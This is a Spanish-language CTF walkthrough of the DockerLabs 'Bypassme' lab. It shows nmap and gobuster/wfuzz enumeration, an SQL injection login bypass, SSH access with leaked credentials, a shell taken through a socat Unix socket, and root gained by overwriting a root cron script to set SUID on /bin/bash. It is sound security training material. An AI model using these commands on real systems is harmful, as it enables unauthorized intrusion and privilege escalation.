---
title: DockerLabs - Bypassme
summary: "Write-up del laboratorio Bypassme de DockerLabs"
author: elcybercurioso
date: 2025-11-11
categories: [Post, DockerLabs]
tags: [fácil, sqli, credentials leaking, socket exploiting, file permissions]
media_subpath: "/assets/img/posts/dockerlabs_bypassme"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bypassme]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bypassme]
└─$ nmap -sCV -p22,80 172.17.0.2                                  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b4:a8:42:e7:2b:2f:7a:f9:50:bd:6d:31:8e:36:54:7b (ECDSA)
|_  256 c0:ff:28:31:a3:0b:1a:3d:c3:5f:83:1b:3c:44:28:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-title: Login Panel
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

## análisis

Lo primero que hacemos es buscar con `gobuster` recursos del sistema:


```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bypassme]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.txt,.html 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/welcome.php          (Status: 302) [Size: 0] [--> index.php]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 1826]
/logs                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Nos encontramos un panel de login en `login.php`:

![Desktop View](/20251110161120.webp){: width="972" height="589" .shadow}

Probamos inyecciones SQL básicas como `' or '1'='1';-- -`:

![Desktop View](/20251110173859.webp){: width="972" height="589" .shadow}

Y vemos que logramos acceder:

![Desktop View](/20251110174021.webp){: width="972" height="589" .shadow}

Vemos múltiples avisos que mencionan la existencia de un fichero log que se encuentra disponible:

![Desktop View](/20251110174158.webp){: width="972" height="589" .shadow}

## acceso inicial (albert)

Tratamos de ver si el fichero `logs.txt` se encuentra en alguna carpeta que podamos listar (empleando **gobuster**), y pasado un rato, nos indica que se encuentra en la carpeta `logs`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bypassme]
└─$ wfuzz -c --hw=6 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Cookie: PHPSESSID=3kvtfmosnk3nntrk4527e8euvv" -L -u "http://172.17.0.2/index.php?page=FUZZ/logs.txt"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz´s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/index.php?page=FUZZ/logs.txt
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000002271:   200        28 L     188 W      1639 Ch     "logs"
```

Listamos el contenido del fichero `logs.txt`, donde encontramos múltiples credenciales:

![Desktop View](/20251110175820.webp){: width="972" height="589" .shadow}

Dado que las credenciales parecen codificadas en base64, procedemos a decodificarlas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bypassme]
└─$ echo "N***********" | base64 -d; echo
4********
```

Probamos a ver si las credenciales decodificadas son válidas, pero nos daremos cuenta de que ninguna es válida.

Otra opción es que la contraseña de SSH sea la misma, pero codificada en base64, y resulta ser que esa es la respuesta en este caso:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Bypassme]
└─$ ssh albert@172.17.0.2
albert@172.17.0.2`s password: 
albert@d14f6a23086d:~$ whoami
albert
albert@d14f6a23086d:~$ hostname -I
172.17.0.2
```

## movimiento lateral (conx)

Una vez dentro, revisamos los usuarios que tengan una consola asignada en `/etc/passwd`:

```bash
albert@d14f6a23086d:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
albert:x:1001:1001::/home/albert:/bin/bash
conx:x:1002:1002::/home/conx:/bin/bash
```

Revisamos también todos los procesos existentes con `ps`, donde encontramos que hay un socket abierto en `/home/conx/.cache/.sock`:

```bash
albert@d14f6a23086d:~$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4324  3128 ?        Ss   05:20   0:00 /bin/bash /etc/.start_services
root          24  0.0  0.1 203464 21720 ?        Ss   05:20   0:07 /usr/sbin/apache2 -k start
root          44  0.0  0.0  12020  4064 ?        Ss   05:20   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          50  0.0  0.0   3808  1792 ?        Ss   05:20   0:00 /usr/sbin/cron -P
conx          54  0.0  0.0   9288  3644 ?        S    05:20   0:00 socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash
root          57  0.0  0.0   2728  1464 ?        S    05:20   0:05 tail -f /dev/null
www-data    3005  0.1  0.1 203964 16248 ?        S    10:50   0:05 /usr/sbin/apache2 -k start
www-data    3016  0.1  0.1 204132 16248 ?        S    10:50   0:05 /usr/sbin/apache2 -k start
www-data    3024  0.1  0.1 204140 16644 ?        S    10:50   0:05 /usr/sbin/apache2 -k start
www-data    3043  0.1  0.1 204132 16632 ?        S    10:51   0:05 /usr/sbin/apache2 -k start
www-data    3350  0.0  0.1 203964 16128 ?        S    11:09   0:00 /usr/sbin/apache2 -k start
www-data    3351  0.0  0.1 204132 16504 ?        S    11:09   0:00 /usr/sbin/apache2 -k start
www-data    3352  0.0  0.1 204132 16504 ?        S    11:09   0:00 /usr/sbin/apache2 -k start
www-data    3354  0.0  0.1 203964 16248 ?        S    11:09   0:00 /usr/sbin/apache2 -k start
www-data    3355  0.0  0.1 204132 16248 ?        S    11:09   0:00 /usr/sbin/apache2 -k start
www-data    3358  0.0  0.1 203964 16092 ?        S    11:09   0:00 /usr/sbin/apache2 -k start
root        3527  0.0  0.0  14432  9808 ?        Ss   11:23   0:00 sshd: albert [priv]
albert      3538  0.6  0.0  14832  6716 ?        S    11:24   0:13 sshd: albert@pts/0
albert      3539  0.0  0.0   5016  4252 pts/0    Ss   11:24   0:00 -bash
albert      3808  0.0  0.0   9288  3692 pts/0    S+   11:45   0:00 socat - UNIX-CONNECT:/home/conx/.cache/.sock
conx        3809  0.0  0.0   9288  1860 ?        S    11:45   0:00 socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash
conx        3810  0.0  0.0   4752  3240 ?        S    11:45   0:00 /bin/bash
conx        3817  0.0  0.0   3144  1980 ?        S    11:46   0:00 script -c bash /dev/null
conx        3818  0.0  0.0   5016  4000 pts/1    Ss+  11:46   0:00 bash
root        3880  0.3  0.0  14432 10032 ?        Ss   11:55   0:00 sshd: albert [priv]
albert      3891  0.9  0.0  14692  6444 ?        S    11:55   0:00 sshd: albert@pts/2
albert      3892  0.0  0.0   5016  3988 pts/2    Ss   11:55   0:00 -bash
albert      3897 50.0  0.0   9580  4808 pts/2    R+   11:55   0:00 ps -aux
```

Nos conectamos a él, y obtenemos una consola como el usuario `conx`:

```bash
albert@d14f6a23086d:/tmp$ socat - UNIX-CONNECT:/home/conx/.cache/.sock
script -c bash /dev/null
Script started, output log file is '/dev/null'.
conx@d14f6a23086d:~$ whoami
whoami
conx
```

Tratamos la TTY para obtener una consola totalmente funcional:

```bash
conx@d14f6a23086d:~$ ^Z
[1]+  Stopped                 socat - UNIX-CONNECT:/home/conx/.cache/.sock
albert@d14f6a23086d:/tmp$ stty raw -echo; fg
socat - UNIX-CONNECT:/home/conx/.cache/.sock
                                            reset xterm
conx@d14f6a23086d:~$ export TERM=xterm
conx@d14f6a23086d:~$ export SHELL=bash
conx@d14f6a23086d:~$ stty rows 48 columns 210
```

## escalada de privilegios (root)

Ahora, buscamos ficheros que podamos leer, y cuyo propietario sea el usuario `conx`:

```bash
albert@d14f6a23086d:~$ find / -user conx -readable 2>/dev/null | grep -vE '/proc'
/var/backups/backup.sh
```

Vemos que los permisos del script `/var/backups/backup.sh` nos permiten modificarlo:

```bash
albert@d14f6a23086d:~$ ls -la /var/backups/backup.sh
-rw-rw-r-- 1 conx root 246 May 22 15:47 /var/backups/backup.sh
```

El contenido del script es el siguiente:

```bash
albert@d14f6a23086d:~$ cat /var/backups/backup.sh
#!/bin/bash

SRC="/home/conx"
DEST="/var/lib/.snapshots/backup.tar.gz"

echo "[*] Starting backup..."
tar -czf "$DEST" "$SRC" >/dev/null 2>&1
echo "[*] Backup completed at $(date)"

# Dev note: eval $HOOK was added for future hooks
eval "$HOOK"
```

Continuamos revisando los procesos del sistema, buscando posibles tareas cron desplegadas:

```bash
albert@d14f6a23086d:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

CMD: UID=0     PID=57     | tail -f /dev/null 
CMD: UID=1002  PID=54     | socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash 
CMD: UID=0     PID=50     | /usr/sbin/cron -P 
CMD: UID=0     PID=44     | sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups 
CMD: UID=0     PID=24     | /usr/sbin/apache2 -k start 
CMD: UID=0     PID=1      | /bin/bash /etc/.start_services 
CMD: UID=0     PID=3691   | /usr/sbin/CRON -P 
CMD: UID=0     PID=3692   | /usr/sbin/CRON -P 
CMD: UID=0     PID=3693   | bash /var/backups/backup.sh 
CMD: UID=0     PID=3694   | tar -czf /var/lib/.snapshots/backup.tar.gz /home/conx 
CMD: UID=0     PID=3695   | 
CMD: UID=0     PID=3696   | bash /var/backups/backup.sh 
CMD: UID=0     PID=3699   | /usr/sbin/CRON -P 
CMD: UID=0     PID=3700   | /usr/sbin/CRON -P 
CMD: UID=0     PID=3701   | bash /var/backups/backup.sh 
CMD: UID=0     PID=3702   | tar -czf /var/lib/.snapshots/backup.tar.gz /home/conx 
CMD: UID=0     PID=3703   | tar -czf /var/lib/.snapshots/backup.tar.gz /home/conx 
CMD: UID=0     PID=3704   | bash /var/backups/backup.sh
```

Vemos que el script que identificamos anteriormente está siendo ejecutado en una tarea cron por el usuario `root`.

Por ello, lo que haremos será modificarlo para que cambie los permisos del binario `/bin/bash`, el cual por defecto tiene los siguientes permisos:

```bash
conx@d14f6a23086d:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Modificamos el script con la instrucción que cambia los permisos del binario a SUID:

```bash
conx@d14f6a23086d:~$ echo "chmod u+s /bin/bash" > /var/backups/backup.sh
```

Pasado un tiempo, si revisamos sus permisos, veremos que ahora `/bin/bash` es SUID:

```bash
conx@d14f6a23086d:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Llegados a este punto, procedemos a invocar una consola privilegiada como el usuario `root`:

```bash
conx@d14f6a23086d:~$ bash -p
bash-5.2# whoami
root
```

De esta manera, habremos conseguido explotar este laboratorio!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>